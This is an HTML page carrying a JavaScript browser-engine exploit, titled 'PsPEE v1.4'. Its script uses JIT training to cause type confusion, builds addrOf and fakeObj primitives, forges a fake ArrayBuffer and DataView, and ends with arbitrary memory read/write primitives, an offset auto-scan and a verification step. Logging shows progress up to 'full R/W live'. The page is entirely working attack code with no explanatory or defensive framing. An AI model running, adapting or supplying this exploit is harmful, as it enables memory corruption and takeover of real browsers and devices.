<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>PsPEE v1.4 — DataView Fix & Auto-Scan</title>
  <style>
    body { background: black; color: lime; font-family: monospace; }
    #log { white-space: pre-wrap; padding: 1em; }
  </style>
</head>
<body>
  <div id="log"></div>
  <script>
    const logDiv = document.getElementById("log");
    const log = msg => { logDiv.textContent += msg + "\n"; };

    // Converters
    const f2i = f => new BigUint64Array(new Float64Array([f]).buffer)[0];
    const i2f = i => new Float64Array(new BigUint64Array([i]).buffer)[0];
    const hex = n => "0x" + n.toString(16).padStart(16, "0");

    // 1) JIT-train & type confusion
    log("[*] Warming up JIT...");
    let float_arr = [1.1,2.2,3.3], obj_arr=[{},{},{}];
    function confuse(o){ let t=[1.1,2.2,3.3]; t[1]=o; return t[1]; }
    function useConfuse(x){ return confuse(x); }
    function train(fn){ for(let i=0;i<20000;i++){ try{fn(2.2)}catch{} } }
    train(useConfuse);
    let baseBits = f2i(useConfuse(2.2)), leakBits = f2i(useConfuse({foo:1}));
    log("[DEBUG] baseBits→"+hex(baseBits)+", leakBits→"+hex(leakBits));
    if(baseBits===leakBits){ log("[-] No confusion"); throw "abort"; }
    log("[+] Type confusion!");

    // 2) Primitives
    function addrOf(obj){
      try { obj_arr[0]=obj; let a=f2i(confuse(obj_arr)); log("[DEBUG] addrOf→"+hex(a)); return a; }
      catch(e){ log("[ERROR] addrOf failed:"+e); return null; }
    }
    function fakeObj(addr){
      try { float_arr[0]=i2f(addr); let o=confuse(float_arr); log("[DEBUG] fakeObj→"+o); return o; }
      catch(e){ log("[ERROR] fakeObj failed:"+e); return null; }
    }

    // 3) Leak real ArrayBuffer
    log("[*] Leaking real ArrayBuffer…");
    let ab = new ArrayBuffer(0x100);
    let ab_addr = addrOf(ab);
    if(!ab_addr) throw "abort"; log("[+] ArrayBuffer @"+hex(ab_addr));

    // 4) Build container skeleton
    let jsCellHeader = (()=>{try{return i2f(0x0108200700000000n);}catch{return i2f(0n);}})();
    let butterfly = ab_addr;
    let vectorLength = (()=>{try{return i2f(0x100n);}catch{return i2f(0n);}})();
    let backingStore = i2f(ab_addr+0x20n);
    log("[DEBUG] container skeleton:",);
    log("  jsCellHeader="+hex(f2i(jsCellHeader)));
    log("  butterfly   ="+hex(butterfly));
    log("  vectorLength="+hex(f2i(vectorLength)));
    log("  backingStore="+hex(f2i(backingStore)));
    let container = { jsCellHeader, butterfly, vectorLength, backingStore, fake: ab };
    let containerAddr = addrOf(container);
    if(!containerAddr) throw "abort"; log("[+] container @"+hex(containerAddr));

    // 5) Create fake ArrayBuffer and fix its prototype
    let fakeAb = fakeObj(containerAddr+0x20n);
    if(!fakeAb) throw "abort"; log("[+] fakeAb created");
    try {
      Object.setPrototypeOf(fakeAb, ArrayBuffer.prototype);
      log("[+] fakeAb.prototype → ArrayBuffer.prototype");
    } catch(e) {
      log("[ERROR] setPrototypeOf failed: "+e); throw "abort";
    }

    // 6) Bind DataView to fakeAb
    let dv;
    try {
      dv = new DataView(fakeAb);
      log("[+] DataView(fakeAb) succeeded");
    } catch(e) {
      log("[ERROR] DataView(fakeAb) failed: "+e);
      throw "abort";
    }

    // R/W primitives
    function read64(addr){
      try { container.backingStore = i2f(addr); let v = f2i(dv.getFloat64(0,true)); return v; }
      catch(e){ log(`[ERROR] read64(${hex(addr)}) ${e}`); return null; }
    }
    function write64(addr,val){
      try { container.backingStore = i2f(addr); dv.setFloat64(0,i2f(val),true); log(`[DEBUG] write64(${hex(addr)},${hex(val)}) OK`); }
      catch(e){ log(`[ERROR] write64 failed: ${e}`); }
    }

    // 7) Sanity dump
    log("[*] Sanity dump real JSCell (0–0x18):");
    for(let off=0n;off<32n;off+=8n){
      let v = read64(ab_addr+off);
      log(`  [${hex(off)}] → ${v===null?"ERR":hex(v)}`);
    }

    // 8) Auto-scan for backingStore offset
    log("[*] Auto-scanning for backingStore offset…");
    const MAX=0x10000n; let limit=0x60n, cands=[];
    while(limit<=MAX){
      log(`  scanning 0→${hex(limit)}…`);
      for(let off=0n; off<=limit; off+=8n){
        let addr=ab_addr+off, v=read64(addr);
        if(v && v>0x100000n && v<0xFFFFFFFFFFn){
          log(`    [CAND] off=${hex(off)} → ${hex(v)}`);
          cands.push(off);
        }
      }
      if(cands.length) break;
      limit*=2n;
    }
    if(!cands.length){ log(`[ERROR] No candidates up to ${hex(MAX)}`); throw "abort"; }
    let off_bs=cands[0]; log("[+] backingStore offset="+hex(off_bs));
    container.backingStore = i2f(ab_addr+off_bs);

    // 9) Verify R/W
    let testObj={magic:0x1337}, testAddr=addrOf(testObj);
    log("[+] testObj @"+hex(testAddr));
    let before=read64(testAddr);
    if(before!==null){ write64(testAddr,before^0x5555555555555555n); let after=read64(testAddr);
      log(`[+] R/W verify: ${hex(before)}→${hex(after)}`);
    } else log("[ERROR] read64(testObj) failed");

    log("[*] Done—full R/W live!");
  </script>
</body>
</html>
